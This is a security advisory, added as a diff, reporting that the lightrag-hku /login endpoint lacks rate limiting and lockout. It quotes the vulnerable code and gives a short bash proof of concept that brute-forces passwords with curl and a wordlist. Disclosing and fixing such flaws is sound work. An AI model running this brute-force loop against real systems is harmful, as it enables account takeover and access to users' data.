@@ -1,0 +1,46 @@
+PYSEC-2026-4062 PyPI/lightrag-hku — lightrag-hku: No Rate Limiting on /login Endpoint Allows Brute-Force Attacks
+package: lightrag-hku
+ecosystem: PyPI
+versions affected:
+  >= 0, < 1.5.5 (ECOSYSTEM)
+aliases: CVE-2026-85734, GHSA-frch-4w6v-q5xx
+references:
+  https://github.com/HKUDS/LightRAG/security/advisories/GHSA-frch-4w6v-q5xx
+  https://nvd.nist.gov/vuln/detail/CVE-2026-85734
+  https://github.com/HKUDS/LightRAG/pull/3424
+  https://github.com/HKUDS/LightRAG/commit/135bc9056e9ecd800c1abe2f2ce24d1a86622a54
+  https://github.com/HKUDS/LightRAG
+  https://github.com/HKUDS/LightRAG/releases/tag/v1.5.5
+  https://pypi.org/project/lightrag-hku
+  https://github.com/advisories/GHSA-frch-4w6v-q5xx
+
+### Summary
+The POST /login endpoint has no rate limiting, account lockout, or delay on failed attempts. An attacker can submit unlimited password guesses at full network speed.
+
+### Details
+
+```python
+# lightrag/api/lightrag_server.py:2161
+@app.post("/login")
+async def login(form_data: OAuth2PasswordRequestForm = Depends()):
+    if not auth_handler.verify_password(username, form_data.password):
+        raise HTTPException(status_code=401, detail="Incorrect credentials")
+    # No: rate limit / lockout / backoff / CAPTCHA / attempt counter
+```
+
+A search for slowapi, rate_limit, lockout, or throttle in lightrag/api/ returns zero results.
+
+### PoC
+
+```bash
+# Brute-force /login with a wordlist, no throttling
+while IFS= read -r pass; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" \
+    -X POST http://<TARGET>:9621/login \
+    -d "username=admin&password=${pass}")
+  [ "$code" = "200" ] && echo "[FOUND] $pass" && break
+done < /usr/share/wordlists/rockyou.txt
+```
+
+### Impact
+Improper restriction of authentication attempts. Any network-reachable attacker can brute-force user passwords without restriction. Once credentials are recovered, the attacker gains full authenticated access to all documents, knowledge graph, and administrative operations.
